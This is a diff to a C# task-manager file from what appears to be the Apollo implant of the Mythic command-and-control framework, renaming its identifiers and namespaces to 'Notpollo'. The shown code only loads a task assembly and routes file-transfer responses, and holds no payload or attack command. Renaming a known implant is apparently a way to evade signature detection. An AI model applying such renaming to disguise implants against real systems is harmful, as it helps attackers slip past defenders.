@@ -3,19 +3,19 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Collections.Concurrent;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Types.Delegates;
-using ApolloInterop.Structs.MythicStructs;
-using ApolloInterop.Enums.ApolloEnums;
-using ApolloInterop.Classes;
+using NotpolloInterop.Interfaces;
+using NotpolloInterop.Types.Delegates;
+using NotpolloInterop.Structs.MythicStructs;
+using NotpolloInterop.Enums.NotpolloEnums;
+using NotpolloInterop.Classes;
 using System.Threading;
 using ThreadingTask = System.Threading.Tasks.Task;
 using System.Reflection;
 using System.Security;
 using System.Security.Permissions;
-using ApolloInterop.Classes.Collections;
+using NotpolloInterop.Classes.Collections;
 
-namespace Apollo.Management.Tasks
+namespace Notpollo.Management.Tasks
 {
     public class TaskManager : ITaskManager
     {
@@ -102,7 +102,7 @@ namespace Apollo.Management.Tasks
 
         private void InitializeTaskLibrary()
         {
-            // Annoying note - if there's an assembly in the Tasks DLL that isn't in the Apollo
+            // Annoying note - if there's an assembly in the Tasks DLL that isn't in the Notpollo
             // reference assemblies, then you'll run into loading errors.
             _tasksAsm = Assembly.Load("Tasks, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
             if (_tasksAsm == null)
@@ -209,7 +209,7 @@ namespace Apollo.Management.Tasks
             {
                 foreach(TaskStatus t in resp.Responses)
                 {
-                    if (_agent.GetFileManager().GetPendingTransfers().Contains(t.ApolloTrackerUUID))
+                    if (_agent.GetFileManager().GetPendingTransfers().Contains(t.NotpolloTrackerUUID))
                     {
                         _agent.GetFileManager().ProcessResponse(t);
                     }
